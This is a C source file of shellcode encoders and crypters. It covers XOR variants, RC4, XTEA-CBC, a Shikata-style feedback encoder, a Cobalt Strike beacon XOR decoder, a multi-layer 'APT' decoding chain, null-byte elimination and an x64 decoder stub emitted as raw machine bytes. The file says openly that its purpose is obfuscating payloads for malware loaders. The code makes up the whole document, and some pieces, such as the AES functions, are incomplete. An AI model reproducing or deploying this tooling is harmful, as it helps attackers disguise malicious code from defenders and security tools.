/*
 * Encoders & Crypters - XOR, RC4, XTEA, polymorphic stubs
 * Patterns from Cobalt Strike, Metasploit shikata_ga_nai, APT loaders
 */

#include <windows.h>

// ============================================================================
// XOR MACROS - inline for shellcode
// ============================================================================

#define XOR1(b,l,k) do{BYTE*_=(b);DWORD n=(l);while(n--)*_++^=(k);}while(0)
#define XORN(b,l,k,kl) do{BYTE*_=(b);for(DWORD i=0;i<(l);i++)_[i]^=(k)[i%(kl)];}while(0)
#define XORR(b,l,k) do{BYTE*_=(b);BYTE _k=(k);for(DWORD i=0;i<(l);i++){BYTE t=_[i];_[i]^=_k;_k=t;}}while(0)
#define XORI(b,l,k) do{BYTE*_=(b);for(DWORD i=0;i<(l);i++)_[i]^=(k)^i;}while(0)
#define NOT(b,l) do{BYTE*_=(b);DWORD n=(l);while(n--){*_=~*_;_++;}}while(0)
#define ADD(b,l,k) do{BYTE*_=(b);DWORD n=(l);while(n--)*_+++=k;}while(0)
#define SUB(b,l,k) do{BYTE*_=(b);DWORD n=(l);while(n--)*_++-=k;}while(0)
#define ROL8(x,n) ((BYTE)(((x)<<(n))|((x)>>(8-(n)))))
#define ROR8(x,n) ((BYTE)(((x)>>(n))|((x)<<(8-(n)))))

// ============================================================================
// RC4 - Cobalt Strike beacon encryption
// ============================================================================

#pragma pack(push,1)
typedef struct {
    BYTE S[256];
    DWORD i;
    DWORD j;
} RC4_STATE;
#pragma pack(pop)

__forceinline void rc4_init(RC4_STATE* s, BYTE* k, DWORD kl)
{
    for(int i = 0; i < 256; i++) s->S[i] = i;

    for(int i = 0, j = 0; i < 256; i++) {
        j = (j + s->S[i] + k[i % kl]) & 0xFF;
        BYTE t = s->S[i]; s->S[i] = s->S[j]; s->S[j] = t;
    }

    s->i = s->j = 0;
}

__forceinline void rc4_crypt(RC4_STATE* s, BYTE* d, DWORD dl)
{
    for(DWORD n = 0; n < dl; n++) {
        s->i = (s->i + 1) & 0xFF;
        s->j = (s->j + s->S[s->i]) & 0xFF;
        BYTE t = s->S[s->i]; s->S[s->i] = s->S[s->j]; s->S[s->j] = t;
        d[n] ^= s->S[(s->S[s->i] + s->S[s->j]) & 0xFF];
    }
}

// Compact single-call RC4
void rc4(BYTE* d, DWORD dl, BYTE* k, DWORD kl)
{
    BYTE S[256];
    for(int i = 0; i < 256; i++) S[i] = i;
    for(int i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + k[i % kl]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    for(DWORD n = 0, i = 0, j = 0; n < dl; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
        d[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

// ============================================================================
// XTEA - lightweight block cipher (Donut uses this)
// ============================================================================

#define XTEA_DELTA 0x9E3779B9
#define XTEA_ROUNDS 32

void xtea_enc(DWORD* v, DWORD* k)
{
    DWORD v0 = v[0], v1 = v[1], sum = 0;
    for(int i = 0; i < XTEA_ROUNDS; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
        sum += XTEA_DELTA;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
    }
    v[0] = v0; v[1] = v1;
}

void xtea_dec(DWORD* v, DWORD* k)
{
    DWORD v0 = v[0], v1 = v[1], sum = XTEA_DELTA * XTEA_ROUNDS;
    for(int i = 0; i < XTEA_ROUNDS; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
        sum -= XTEA_DELTA;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
    }
    v[0] = v0; v[1] = v1;
}

// CBC mode for shellcode
void xtea_cbc_dec(BYTE* d, DWORD dl, DWORD* k, BYTE* iv)
{
    DWORD prev[2] = {*(DWORD*)iv, *(DWORD*)(iv+4)};

    for(DWORD i = 0; i < dl; i += 8) {
        DWORD tmp[2] = {*(DWORD*)(d+i), *(DWORD*)(d+i+4)};
        xtea_dec((DWORD*)(d+i), k);
        *(DWORD*)(d+i) ^= prev[0];
        *(DWORD*)(d+i+4) ^= prev[1];
        prev[0] = tmp[0]; prev[1] = tmp[1];
    }
}

// ============================================================================
// SHIKATA_GA_NAI - Metasploit polymorphic encoder
// ============================================================================

/*
 * Decoder structure:
 * - Random garbage instructions (polymorphic)
 * - GetPC via FPU: fld1; fnstenv [esp-0xC]; pop reg
 * - XOR loop with feedback (key += decoded_dword)
 */

// FPU GetPC stub (shikata signature)
BYTE fpu_getpc[] = {
    0xD9, 0xE8,             // fld1
    0xD9, 0x74, 0x24, 0xF4, // fnstenv [esp-0xC]
    0x5B                    // pop ebx (ebx = eip)
};

// x64 decoder stub template
#pragma pack(push,1)
typedef struct {
    BYTE lea_rsi[7];   // 48 8D 35 XX XX XX XX - lea rsi, [rip+off]
    BYTE xor_rcx[3];   // 48 31 C9 - xor rcx, rcx
    BYTE mov_cl;       // B1 XX - mov cl, count
    BYTE count;
    BYTE xor_byte[3];  // 80 36 XX - xor byte [rsi], key
    BYTE inc_rsi[3];   // 48 FF C6 - inc rsi
    BYTE loop_rel[2];  // E2 F8 - loop -8
    // shellcode follows
} XOR_STUB64;
#pragma pack(pop)

// Shikata feedback XOR
void shikata_enc(BYTE* sc, DWORD len, DWORD key)
{
    DWORD* p = (DWORD*)sc;
    DWORD n = len / 4;

    for(DWORD i = 0; i < n; i++) {
        p[i] ^= key;
        key += p[i];  // feedback
    }
}

void shikata_dec(BYTE* sc, DWORD len, DWORD key)
{
    DWORD* p = (DWORD*)sc;
    DWORD n = len / 4;

    for(DWORD i = 0; i < n; i++) {
        DWORD tmp = p[i];
        p[i] ^= key;
        key += tmp;  // feedback from ciphertext
    }
}

// ============================================================================
// COBALT STRIKE BEACON STUB
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD size;
    BYTE  xor_key;
    BYTE  pad[3];
    // BYTE data[];
} CS_STUB;
#pragma pack(pop)

void cs_decode(CS_STUB* blob)
{
    BYTE* data = (BYTE*)(blob + 1);
    DWORD size = blob->size;
    BYTE key = blob->xor_key;

    for(DWORD i = 0; i < size; i++)
        data[i] ^= key;
}

// ============================================================================
// MULTI-LAYER ENCODING (APT pattern)
// ============================================================================

// Layer 1: XOR with key
// Layer 2: NOT
// Layer 3: ADD constant
// Layer 4: RC4 with derived key

void multilayer_dec(BYTE* d, DWORD dl, BYTE* k1, DWORD k1l, BYTE add_k)
{
    // RC4 first (outer layer)
    rc4(d, dl, k1, k1l);

    // SUB
    for(DWORD i = 0; i < dl; i++)
        d[i] -= add_k;

    // NOT
    for(DWORD i = 0; i < dl; i++)
        d[i] = ~d[i];

    // XOR with index
    for(DWORD i = 0; i < dl; i++)
        d[i] ^= (BYTE)i;
}

// ============================================================================
// NULL-FREE ENCODING
// ============================================================================

// Eliminate nulls by XOR with marker + position
void null_elim(BYTE* d, DWORD dl, BYTE marker)
{
    for(DWORD i = 0; i < dl; i++) {
        if(d[i] == 0x00)
            d[i] = marker ^ (BYTE)i;
    }
}

// Insert null-free XOR key into shellcode
// Returns key that produces no nulls when XORed with data
BYTE find_xor_key(BYTE* d, DWORD dl)
{
    for(DWORD k = 1; k < 256; k++) {
        BOOL clean = 1;
        for(DWORD i = 0; i < dl; i++) {
            if((d[i] ^ k) == 0) { clean = 0; break; }
        }
        if(clean) return (BYTE)k;
    }
    return 0;  // no single-byte key works
}

// ============================================================================
// CHACHA20 (simplified - used by some APTs)
// ============================================================================

#define ROTL(a,b) (((a) << (b)) | ((a) >> (32 - (b))))
#define QR(a,b,c,d) do { \
    a+=b; d^=a; d=ROTL(d,16); \
    c+=d; b^=c; b=ROTL(b,12); \
    a+=b; d^=a; d=ROTL(d,8);  \
    c+=d; b^=c; b=ROTL(b,7);  \
} while(0)

void chacha_block(DWORD* out, DWORD* in)
{
    DWORD x[16];
    for(int i = 0; i < 16; i++) x[i] = in[i];

    for(int i = 0; i < 10; i++) {
        // Column rounds
        QR(x[0], x[4], x[8],  x[12]);
        QR(x[1], x[5], x[9],  x[13]);
        QR(x[2], x[6], x[10], x[14]);
        QR(x[3], x[7], x[11], x[15]);
        // Diagonal rounds
        QR(x[0], x[5], x[10], x[15]);
        QR(x[1], x[6], x[11], x[12]);
        QR(x[2], x[7], x[8],  x[13]);
        QR(x[3], x[4], x[9],  x[14]);
    }

    for(int i = 0; i < 16; i++) out[i] = x[i] + in[i];
}

// ============================================================================
// AES-128 (tableless - for position-independent code)
// ============================================================================

// S-box computed on the fly (no tables)
BYTE aes_sbox(BYTE x)
{
    BYTE y = x, z;
    for(int i = 0; i < 4; i++) y = (y << 1) ^ ((y >> 7) * 0x1B) ^ y;
    z = y;
    for(int i = 0; i < 3; i++) { y = (y << 1) | (y >> 7); z ^= y; }
    return z ^ 0x63;
}

void aes_subbytes(BYTE* s)
{
    for(int i = 0; i < 16; i++) s[i] = aes_sbox(s[i]);
}

void aes_shiftrows(BYTE* s)
{
    BYTE t;
    t = s[1]; s[1] = s[5]; s[5] = s[9]; s[9] = s[13]; s[13] = t;
    t = s[2]; s[2] = s[10]; s[10] = t;
    t = s[6]; s[6] = s[14]; s[14] = t;
    t = s[15]; s[15] = s[11]; s[11] = s[7]; s[7] = s[3]; s[3] = t;
}

// ============================================================================
// DECODER GENERATION
// ============================================================================

// Generate minimal XOR decoder for x64
DWORD gen_xor_dec64(BYTE* out, DWORD sc_len, BYTE key)
{
    DWORD i = 0;

    // lea rsi, [rip + offset_to_shellcode]
    out[i++] = 0x48; out[i++] = 0x8D; out[i++] = 0x35;
    out[i++] = 0x0D; out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00;

    // xor ecx, ecx
    out[i++] = 0x31; out[i++] = 0xC9;

    // mov cl, len
    out[i++] = 0xB1; out[i++] = (BYTE)sc_len;

    // decode_loop: xor byte [rsi], key
    out[i++] = 0x80; out[i++] = 0x36; out[i++] = key;

    // inc rsi
    out[i++] = 0x48; out[i++] = 0xFF; out[i++] = 0xC6;

    // loop decode_loop (-8 bytes)
    out[i++] = 0xE2; out[i++] = 0xF8;

    // jmp to decoded shellcode (offset 0)
    out[i++] = 0xEB; out[i++] = 0x00;

    return i;
}

// ============================================================================
// STAGED DECRYPTION (Download + Decrypt pattern)
// ============================================================================

typedef struct {
    DWORD magic;      // 0xDEADBEEF
    DWORD enc_type;   // 0=XOR, 1=RC4, 2=XTEA
    DWORD key_len;
    DWORD data_len;
    // BYTE key[];
    // BYTE data[];
} STAGED_HDR;

void staged_decrypt(STAGED_HDR* hdr)
{
    BYTE* key = (BYTE*)(hdr + 1);
    BYTE* data = key + hdr->key_len;

    switch(hdr->enc_type) {
        case 0:  // XOR
            XORN(data, hdr->data_len, key, hdr->key_len);
            break;
        case 1:  // RC4
            rc4(data, hdr->data_len, key, hdr->key_len);
            break;
        case 2:  // XTEA
            xtea_cbc_dec(data, hdr->data_len, (DWORD*)key, key + 16);
            break;
    }
}

// ============================================================================
// EOF
// ============================================================================
